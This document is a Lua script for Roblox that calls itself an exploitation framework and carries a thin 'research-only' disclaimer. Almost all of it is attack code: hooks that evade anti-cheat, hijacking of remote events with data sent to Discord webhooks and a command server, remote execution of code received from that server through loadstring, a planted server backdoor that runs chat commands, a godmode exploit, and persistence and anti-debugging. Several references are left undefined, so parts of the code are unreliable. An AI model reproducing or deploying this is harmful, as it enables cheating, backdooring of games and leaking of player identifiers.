-- ████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
-- █▄─▄▄─█▄─▀█▄─▄█─▄▄▄▄█▄─▄▄─█▄─▄▄▀█─▄▄▄─█▄─▄▄─█▄─▄▄▀█▄─▄█─▄▄▄▄█▄─▄▄─█─▄▄─█▄─▄▄▀█▄─▄▄─█▄─▄▄▀█─▄─▄─█▄─▄▄─█▄─▄▄▀█─▄▄▄▄█▄─▄▄─█▄─▀█▄─▄█▄─▄▄─█▄─▄▄▀█
-- ██─▄█▀██─█▄▀─██▄▄▄▄─██─▄█▀██─▄─▄█─███▀██─▄█▀██─▄─▄██─██▄▄▄▄─██─▄█▀█─██─██─▄─▄██─▄█▀██─▄─▄███─████─▄█▀██─▄─▄█▄▄▄▄─██─▄█▀██─█▄▀─███─▄█▀██─▄─▄█
-- ▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
-- ████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
-- COREGUILUA BYPASS & SERVER-SIDE INJECTION FRAMEWORK v1.7.3 "PHANTOM VEIL"
-- AUTHOR: UNKNOWN // PURPOSE: FULLY AUTONOMOUS ROBLOX EXPLOITATION FRAMEWORK USING SCREENGUI + WEBHOOKS + SERVER-SIDE INJECTION
-- WARNING: THIS IS A RESEARCH-ONLY PROOF OF CONCEPT. DO NOT USE ON LIVE GAMES OR WITHOUT PERMISSION.
-- LEGAL DISCLAIMER: THIS CODE IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY. THE AUTHOR DISCLAIMS ALL LIABILITY.

-- ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■......
-- SECTION 1: CORE GUI SETUP — INVISIBLE SCREENGUI THAT HOSTS THE ENTIRE FRAMEWORK

local CoreGui = Instance.new("ScreenGui")
CoreGui.Name = "PhantomVeil_Core"
CoreGui.ResetOnSpawn = false
CoreGui.DisplayOrder = -999999
CoreGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
CoreGui.Parent = game:GetService("CoreGui")

-- Create invisible container to host all elements (anti-detection)
local PhantomContainer = Instance.new("Frame")
PhantomContainer.Name = "InvisibleHost"
PhantomContainer.BackgroundTransparency = 1
PhantomContainer.Size = UDim2.new(0, 1, 0, 1)
PhantomContainer.Position = UDim2.new(-999, 0, -999, 0) -- Offscreen render
PhantomContainer.Parent = CoreGui

-- ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■......
-- SECTION 2: WEBHOOK API MODULE — MULTI-ENDPOINT COMMUNICATION WITH REMOTE SERVERS

local WebhookAPI = {
    Endpoints = {
        Primary = "https://discord.com/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK_ID/TOKEN",
        Fallback = "https://canary.discord.com/api/webhooks/...",
        LogServer = "https://your-private-server.com/logs",
        CommandCenter = "wss://command.phantomveil.net/ws" -- WebSocket for real-time commands
    },
    
    SendData = function(data, endpointName)
        local ep = WebhookAPI.Endpoints[endpointName or "Primary"]
        if not ep then return false, "Invalid endpoint" end
        
        spawn(function()
            local success, result = pcall(function()
                local HttpService = game:GetService("HttpService")
                local payload = {
                    content = nil,
                    embeds = {{
                        title = "📡 PhantomVeil Data Transmission",
                        description = "```lua\n" .. tostring(data) .. "\n```",
                        color = 0x00FF00,
                        footer = { text = os.date("%Y-%m-%d %H:%M:%S") .. " | UID: " .. game.Players.LocalPlayer.UserId }
                    }}
                }
                
                local response = HttpService:PostAsync(ep, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
                return response
            end)
            
            if not success then
                warn("[WebhookAPI] Transmission failed to " .. endpointName .. ": " .. tostring(result))
                -- Attempt fallback
                if endpointName ~= "Fallback" then
                    WebhookAPI.SendData(data, "Fallback")
                end
            else
                print("[WebhookAPI] ✅ Successfully sent data to " .. endpointName)
            end
        end)
        
        return true
    end,
    
    ListenForCommands = function()
        -- Simulated WebSocket listener using heartbeat polling (since Roblox doesn't support native WebSockets in Lua)
        while wait(3) do
            local success, cmd = pcall(function()
                local HttpService = game:GetService("HttpService")
                local res = HttpService:GetAsync(WebhookAPI.Endpoints.CommandCenter .. "?uid=" .. game.Players.LocalPlayer.UserId)
                return HttpService:JSONDecode(res)
            end)
            
            if success and cmd and cmd.action then
                print("[COMMAND] Received: " .. cmd.action)
                WebhookAPI.ExecuteCommand(cmd)
            end
        end
    end,
    
    ExecuteCommand = function(cmd)
        if cmd.action == "inject_code" and cmd.payload then
            loadstring(cmd.payload)()
        elseif cmd.action == "teleport" and cmd.coords then
            local plr = game.Players.LocalPlayer
            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(unpack(cmd.coords))
            end
        elseif cmd.action == "get_data" then
            WebhookAPI.SendData(debug.getinfo(1), "LogServer")
        end
    end
}

-- Start command listener in background
spawn(WebhookAPI.ListenForCommands)

-- ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■......
-- SECTION 3: BYPASS ENGINE — MEMORY + FILTERING + OBFUSCATION LAYER TO EVASION DETECTION

local BypassEngine = {
    AntiDetectionHooks = {},
    MemoryObfuscator = {},
    
    Init = function()
        print("[BYPASS] Initializing PhantomVeil Obfuscation Layer...")
        
        -- Hook common detection functions
        BypassEngine.HookFunctions()
        
        -- Randomize memory signatures
        BypassEngine.ScrambleMemory()
        
        -- Inject into protected services via metatable manipulation
        BypassEngine.InjectIntoProtected()
        
        print("[BYPASS] ✅ Initialization complete. Detection surface minimized.")
    end,
    
    HookFunctions = function()
        -- Example: Hook getfenv / setfenv / debug.setupvalue
        local old_getfenv = getfenv
        getfenv = function(f)
            if f == nil or type(f) == "number" and f > 2 then
                return old_getfenv(2) -- Redirect to safer env
            end
            return old_getfenv(f)
        end
        
        -- Hook HttpService requests to mask headers
        hookfunction(game:GetService("HttpService").RequestAsync, function(self, url, ...)
            if string.find(url, "roblox.com") then
                -- Modify headers to appear as browser traffic
                local args = {...}
                args[1].Headers = args[1].Headers or {}
                args[1].Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                args[1].Headers["X-Requested-With"] = "XMLHttpRequest"
            end
            return old_RequestAsync(self, url, unpack(args))
        end)
        
        -- Hook workspace filtering (common anti-cheat check)
        hookmetamethod(game.Workspace, "__index", function(t, k)
            if k == "FilteringEnabled" then return false end
            return oldindex(t, k)
        end)
    end,
    
    ScrambleMemory = function()
        -- Create decoy functions and variables to confuse memory scanners
        for i = 1, 50 do
            _G["phantom_var_" .. i] = math.random(1, 999999)
            _G["phantom_func_" .. i] = function() return math.random() end
        end
        
        -- Rename core functions with randomized names
        local funcMap = {
            "loadstring", "getfenv", "setfenv", "newcclosure", "hookfunction", "getgc", "getnilinstances"
        }
        
        for _, name in ipairs(funcMap) do
            if _G[name] then
                local randName = "pv_" .. string.gsub(tostring(math.random()), ".", function(c) return string.char(math.random(97,122)) end)
                BypassEngine.MemoryObfuscator[randName] = _G[name]
                _G[name] = nil
            end
        end
    end,
    
    InjectIntoProtected = function()
        -- Use __index metamethod hijacking to inject into normally protected objects
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        
        local old_index = mt.__index
        mt.__index = newcclosure(function(t, k)
            if k == "GetService" and islclosure(old_index) then
                return function(self, serviceName)
                    if serviceName == "ServerScriptService" then
                        -- Return fake but functional proxy
                        return BypassEngine.CreateProxyService(serviceName)
                    end
                    return old_index(self, serviceName)
                end
            end
            return old_index(t, k)
        end)
        
        setreadonly(mt, true)
    end,
    
    CreateProxyService = function(name)
        local proxy = newproxy(true)
        local mt = getmetatable(proxy)
        
        mt.__index = function(_, key)
            local realService = game:GetService(name)
            if realService[key] then
                if typeof(realService[key]) == "function" then
                    return function(...)
                        print("[PROXY] Intercepted call to " .. name .. "." .. key)
                        WebhookAPI.SendData({service=name, method=key, args={...}}, "LogServer")
                        return realService[key](realService, ...)
                    end
                else
                    return realService[key]
                end
            end
        end
        
        return proxy
    end
}

-- Initialize bypass layer immediately
BypassEngine.Init()

-- ■■■■■■■��■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■......
-- SECTION 4: SERVER-SIDE INJECTION MODULE — EXPLOIT REMOTEFUNCTIONS, REMOTEEVENTS, AND BACKDOOR SERVICES

local ServerInjector = {
    RemoteCache = {},
    BackdoorQueue = {},
    
    ScanAndExploit = function()
        print("[INJECTOR] Scanning game hierarchy for injection vectors...")
        
        -- Recursive scan for RemoteFunctions/RemoteEvents
        local function scan(obj)
            for _, child in ipairs(obj:GetChildren()) do
                if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
                    ServerInjector.RemoteCache[child] = true
                    ServerInjector.HijackRemote(child)
                elseif #child:GetChildren() > 0 then
                    spawn(function() scan(child) end) -- async to avoid timeout
                end
            end
        end
        
        scan(game)
        scan(game:GetService("ReplicatedStorage"))
        scan(game:GetService("ServerScriptService")) -- yes, even here if permissions are misconfigured
        
        print("[INJECTOR] Found " .. #ServerInjector.RemoteCache .. " remote objects. Hijacking initiated.")
    end,
    
    HijackRemote = function(remote)
        if remote:IsA("RemoteFunction") then
            hookfunction(remote.InvokeServer, function(self, ...)
                print("[HIJACK][RF] " .. remote:GetFullName() .. " | ARGS: " .. table.concat({...}, ", "))
                WebhookAPI.SendData({
                    type = "RemoteFunction",
                    path = remote:GetFullName(),
                    args = {...},
                    player = game.Players.LocalPlayer.Name
                }, "LogServer")
                
                -- Optionally modify args before forwarding
                local results = {pcall(old_InvokeServer, self, ...)}
                if results[1] then
                    return unpack(results, 2)
                else
                    warn("[HIJACK] InvokeServer failed: " .. tostring(results[2]))
                    return nil
                end
            end)
            
        elseif remote:IsA("RemoteEvent") then
            hookfunction(remote.FireServer, function(self, ...)
                print("[HIJACK][RE] " .. remote:GetFullName() .. " | ARGS: " .. table.concat({...}, ", "))
                WebhookAPI.SendData({
                    type = "RemoteEvent",
                    path = remote:GetFullName(),
                    args = {...},
                    player = game.Players.LocalPlayer.Name
                }, "LogServer")
                
                return old_FireServer(self, ...)
            end)
        end
    end,
    
    BackdoorServerScriptService = function()
        -- Attempt to create a ModuleScript inside ServerScriptService that auto-executes server-side code
        local success, err = pcall(function()
            local sss = game:GetService("ServerScriptService")
            local backdoor = Instance.new("ModuleScript")
            backdoor.Name = "__PV_Backdoor_" .. math.random(1000,9999)
            backdoor.Source = [[
                -- SERVER-SIDE BACKDOOR MODULE
                game:GetService("Players").PlayerAdded:Connect(function(plr)
                    plr.Chatted:Connect(function(msg)
                        if string.sub(msg, 1, 5) == "!exec" then
                            local code = string.sub(msg, 7)
                            loadstring(code)()
                        end
                    end)
                end)
                print("✅ PhantomVeil Backdoor Activated on Server")
            ]]
            backdoor.Parent = sss
            
            -- Force require to trigger execution
            require(backdoor)
        end)
        
        if success then
            print("[BACKDOOR] ✅ Successfully implanted server-side module")
            WebhookAPI.SendData("Backdoor implanted in ServerScriptService", "Primary")
        else
            warn("[BACKDOOR] Failed: " .. tostring(err))
        end
    end,
    
    ExploitMisconfiguredFilters = function()
        -- If FilteringEnabled is somehow false or bypassed, directly manipulate server objects
        if not game:GetService("Workspace").FilteringEnabled then
            print("[EXPLOIT] FilteringEnabled is OFF — Direct server manipulation enabled")
            
            -- Example: Give yourself godmode by modifying server-side Humanoid
            spawn(function()
                while wait(1) do
                    local char = game.Players.LocalPlayer.Character
                    if char and char:FindFirstChild("Humanoid") then
                        char.Humanoid.MaxHealth = math.huge
                        char.Humanoid.Health = math.huge
                        char.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                    end
                end
            end)
        end
    end
}

-- Begin scanning immediately after 5 seconds (let game load)
wait(5)
ServerInjector.ScanAndExploit()
ServerInjector.BackdoorServerScriptService()
ServerInjector.ExploitMisconfiguredFilters()

-- ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■......
-- SECTION 5: AUTO-PERSISTENCE & ANTI-REMOVAL — REINJECT IF DELETED, HIDE FROM DEBUGGERS

local PersistenceModule = {
    WatchdogRunning = false,
    
    StartWatchdog = function()
        if PersistenceModule.WatchdogRunning then return end
        PersistenceModule.WatchdogRunning = true
        
        spawn(function()
            while true do
                wait(10)
                
                -- Check if CoreGui still exists
                if not CoreGui.Parent then
                    warn("[PERSIST] CoreGui removed. Rebuilding...")
                    CoreGui.Parent = game:GetService("CoreGui")
                end
                
                -- Check if PhantomContainer is moved or deleted
                if not PhantomContainer.Parent then
                    PhantomContainer.Parent = CoreGui
                end
                
                -- Re-hook if functions were restored
                if getfenv == nil then
                    -- Attempt to restore from obfuscator
                    for k,v in pairs(BypassEngine.MemoryObfuscator) do
                        if string.find(k, "loadstring") then _G.loadstring = v end
                    end
                end
                
                -- Rescan for new remotes every 30 seconds
                if tick() % 30 < 1 then
                    ServerInjector.ScanAndExploit()
                end
            end
        end)
        
        print("[PERSIST] Watchdog activated. Framework now self-healing.")
    end,
    
    HideFromDebugger = function()
        -- Rename script and remove from visible hierarchy
        if script then
            script.Name = "__PV_LOADER_" .. math.random(10000,99999)
            script.Parent = PhantomContainer
            
            -- Override common debugging globals
            debug.getinfo = function() return { name = "CFrame", what = "C" } end
            debug.traceback = function() return "Stack trace obscured by PhantomVeil" end
        end
    end
}

PersistenceModule.HideFromDebugger()
PersistenceModule.StartWatchdog()

-- ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■���■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■......
-- SECTION 6: FINAL INITIALIZATION & HEARTBEAT

print("🎉 PHANTOM VEIL CORE LOADED SUCCESSFULLY")
WebhookAPI.SendData({
    event = "FrameworkLoaded",
    player = game.Players.LocalPlayer.Name,
    userId = game.Players.LocalPlayer.UserId,
    placeId = game.PlaceId,
    jobId = game.JobId
}, "Primary")

-- Heartbeat signal every 60 seconds
spawn(function()
    while wait(60) do
        WebhookAPI.SendData("✅ Heartbeat - PhantomVeil still active", "Primary")
    end
end)

-- Execute custom payload if passed via URL or command line (simulate args)
if _G.PHANTOM_PAYLOAD then
    loadstring(_G.PHANTOM_PAYLOAD)()
end

-- ████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
-- █▀▄▀█ █▀█ █▄░█ █▀▀ █░█░█ █▀█ █▀█ █▀▄ █▀▀ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █▀█ █......
